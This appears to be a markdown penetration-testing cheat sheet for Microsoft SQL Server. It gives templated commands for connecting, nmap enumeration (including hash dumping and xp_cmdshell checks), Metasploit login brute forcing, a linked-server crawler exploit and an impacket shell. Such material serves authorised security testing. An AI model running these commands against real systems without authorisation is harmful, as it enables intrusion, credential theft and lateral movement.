# MSSQL

## connect

### sqsh

Run sqsh with MSSQL.

```sh title:"MSSQL Run Sqsh"
sqsh -S "$rhost_ip:$rport" -U "$user" -P "$pass"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user
var pass
-->

## recon

### Nmap enum

Enumerate nmap enum with MSSQL.

```sh title:"MSSQL Enumerate Nmap Enum"
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args "mssql.instance-port=$rport,mssql.username=$user,mssql.password=$pass,mssql.instance-name=$instance_name" -sV -p "$rport" "$rhost_ip"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user := sa
var pass
var instance_name := MSSQLSERVER
-->

### Metasploit enum

Enumerate metasploit enum with MSSQL.

```sh title:"MSSQL Enumerate Metasploit Enum"
msfconsole -x "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $rhost_ip; set RPORT $rport; set USERNAME $user; set PASSWORD $pass; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user
var pass
-->

## brute force

### SQL logins

Enumerate SQL logins with MSSQL.

```sh title:"MSSQL Enumerate SQL Logins"
msfconsole -x "use admin/mssql/mssql_enum_sql_logins; set RHOSTS $rhost_ip; set RPORT $rport; set USER_FILE $user_file; set PASS_FILE $pass_file; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user_file
var pass_file
-->

## linked servers

### Link crawler

Start link crawler with MSSQL.

```sh title:"MSSQL Start Link Crawler"
msfconsole -x "use exploit/windows/mssql/mssql_linkcrawler; set RHOSTS $rhost_ip; set RPORT $rport; set USERNAME $user; set PASSWORD $pass; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user
var pass
-->

## shell

### Impacket Windows auth

Spawn impacket windows auth with MSSQL.

```sh title:"MSSQL Spawn Impacket Windows Auth"
mssqlclient.py -windows-auth "$auth_target" $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->
